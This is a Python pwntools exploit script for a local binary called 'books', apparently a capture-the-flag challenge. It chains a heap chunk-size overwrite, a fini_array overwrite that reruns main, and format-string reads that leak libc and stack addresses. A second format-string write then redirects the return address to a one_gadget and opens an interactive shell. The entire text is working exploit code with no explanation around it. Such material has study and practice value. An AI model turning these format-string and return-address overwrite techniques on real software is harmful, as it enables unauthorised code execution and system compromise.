from pwn import *
context(
	log_level='info',
	binary='./books'
)
e=context.binary
libc=e.libc
io=process()
# io=process('books',env={"LD_PRELOAD":"libc.so.6"})

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('Submit\n',str(func))

def firstOrder(order_name):
	menu(1)
	io.sendlineafter('Enter first order:\n',str(order_name))

def secondOrder(order_name):
	menu(2)
	io.sendlineafter('Enter second order:\n',str(order_name))

def deleteFirst():
	menu(3)

def deleteSecond():
	menu(4)

def submit(s):
	menu(s)


#=========================================
#VAR
fini_array = 0x6011B8 #ctrl+s -> _fini_array #_dl_rtld_di_serinfo
main_addr = 0x400A39 #main
return_off = 0x1e8
libc_off = 0x20830
gadget = [283158,283242,983716,987463]
#=========================================
from pwn import *

deleteSecond()
payload = "%"+str(2617)+"c%13$hn"  + '.%31$p' + ',%28$p'
# payload = '%p.'*40
payload+='A'*(0x74-len(payload))
payload+='\x00'*(0x88-len(payload))+p64(0x151)
firstOrder(payload)
# dbg('b *0x400C8E')
submit('5aaaaaaa'+p64(fini_array))
io.recvline()
io.recvline()
io.recvline()
io.recvuntil('.')
libc_main = int(io.recvuntil(',')[:-1],16)
success('libc_main: ' + hex(libc_main))

libc.address = libc_main - libc_off
success('libc.address: ' + hex(libc.address))

return_addr_off = int(io.recvuntil('A')[:-1],16)
success('return_addr_off: ' + hex(return_addr_off))

return_addr = return_addr_off - return_off
success('return_addr: ' + hex(return_addr))

one_gadget = libc.address + gadget[0]
success('one_gadget: ' + hex(one_gadget))

#===================================================
#fmt 
one_shot1 = '0x'+str(hex(one_gadget))[-2:]
one_shot2 = '0x'+str(hex(one_gadget))[-6:-2]
print one_shot1,one_shot2
one_shot1 = int(one_shot1,16)
one_shot2 = int(one_shot2,16)


#===================================================



# attach(io,'b *0x400C8E')
deleteSecond()
# payload = "%"+str(2617)+"c%13$hn"  + '.%31$p' + ',%28$p'
# payload = "%" + str(one_shot1) + "d%13$hhn" + '%' + str(one_shot2-one_shot1) + 'd%14$hn'
# payload= '%13$p'
payload="%"+str(one_shot1)+"c%13$hhn"
payload+="%"+str(one_shot2-one_shot1)+"c%14$hn"
# payload = "%" + str(one_shot1) + "d%13$hhn" + '%' + str(one_shot2-one_shot1) + 'd%14$hn'
payload+='A'*(0x74-len(payload))
payload+='\x00'*(0x88-len(payload))+p64(0x151)
firstOrder(payload)
# attach(io,'b *0x400C8E')

submit('5aaaaaaa'+p64(return_addr)+p64(return_addr+1))
# print io.recv()





# dbg()

io.interactive()
